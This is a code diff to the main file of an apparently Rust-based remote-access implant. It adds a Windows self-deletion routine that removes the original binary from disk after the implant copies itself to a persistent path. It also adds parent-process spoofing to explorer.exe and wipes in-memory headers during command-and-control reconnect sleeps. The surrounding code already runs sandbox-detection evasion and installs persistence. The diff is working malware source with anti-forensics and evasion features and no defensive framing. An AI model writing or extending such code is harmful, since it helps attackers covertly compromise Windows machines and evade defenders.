@@ -40,12 +40,67 @@ const RECONNECT_BASE: f64 = 1.0;
 const RECONNECT_MAX: f64 = 60.0;
 const RECONNECT_JITTER: f64 = 0.25;
 
+/// Delete the binary at `path` while the process continues running.
+/// Uses SetFileInformationByHandle with FileDispositionInfoEx:
+///   FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
+/// File entry is removed on handle close; the mapped image section persists.
+/// No-op if the file cannot be opened with DELETE access.
+#[cfg(all(target_os = "windows", feature = "stealth"))]
+fn self_delete(path: &std::path::Path) {
+    use std::os::windows::ffi::OsStrExt;
+    use windows::Win32::Storage::FileSystem::{
+        CreateFileW, SetFileInformationByHandle,
+        FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO_EX, FILE_DISPOSITION_INFO_EX_FLAGS,
+        FILE_DISPOSITION_FLAG_DELETE, FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
+        FILE_SHARE_DELETE, FILE_SHARE_READ,
+        FileDispositionInfoEx, OPEN_EXISTING, DELETE,
+    };
+    use windows::core::PCWSTR;
+
+    let wide: Vec<u16> = path.as_os_str()
+        .encode_wide()
+        .chain(std::iter::once(0u16))
+        .collect();
+
+    unsafe {
+        let handle = match CreateFileW(
+            PCWSTR(wide.as_ptr()),
+            DELETE.0,
+            FILE_SHARE_DELETE | FILE_SHARE_READ,
+            None,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            None,
+        ) {
+            Ok(h) if !h.is_invalid() => h,
+            _ => return,
+        };
+
+        let info = FILE_DISPOSITION_INFO_EX {
+            Flags: FILE_DISPOSITION_INFO_EX_FLAGS(
+                FILE_DISPOSITION_FLAG_DELETE.0 | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS.0,
+            ),
+        };
+        let _ = SetFileInformationByHandle(
+            handle,
+            FileDispositionInfoEx,
+            &info as *const _ as *const core::ffi::c_void,
+            std::mem::size_of::<FILE_DISPOSITION_INFO_EX>() as u32,
+        );
+        let _ = windows::Win32::Foundation::CloseHandle(handle);
+    }
+}
+
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
     // IMPORTANT: evasion::init() may call std::process::exit(0) for sandbox detection.
     // It must remain the first statement. Do not insert anything before this line
     // that allocates Drop resources or opens handles.
     evasion::init();
+
+    // Spoof PPID to explorer.exe on first run.
+    // May exit current process — child continues with spoofed parent.
+    unsafe { evasion::ppid::spoof_if_needed(); }
 
     // Install ring as the default rustls crypto provider. Required when both
     // reqwest (ring) and tokio-tungstenite (aws-lc-rs) pull different backends.
@@ -88,6 +143,18 @@ async fn main() -> anyhow::Result<()> {
         dbg_log!("[!] copy_to_stable: {e}");
         std::env::current_exe().unwrap_or_default()
     });
+
+    // Delete original binary from disk after copying to stable path.
+    // Guard: skip if already running from stable path (e.g., on persistence re-launch).
+    #[cfg(all(target_os = "windows", feature = "stealth"))]
+    {
+        if let Ok(current) = std::env::current_exe() {
+            if current != stable_path {
+                self_delete(&current);
+                dbg_log!("[+] self-delete: {}", current.display());
+            }
+        }
+    }
 
     let chain = persistence::get_chain();
     for r in &chain.install_first_available(&stable_path) {
@@ -132,7 +199,9 @@ async fn main() -> anyhow::Result<()> {
         let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
         let delay = backoff * (1.0 + jitter);
         dbg_log!("[*] Reconnecting in {delay:.1}s...");
+        unsafe { evasion::sleep::zero_headers(); }
         tokio::time::sleep(Duration::from_secs_f64(delay)).await;
+        unsafe { evasion::sleep::restore_headers(); }
         backoff = (backoff * 2.0).min(RECONNECT_MAX);
     }
 }
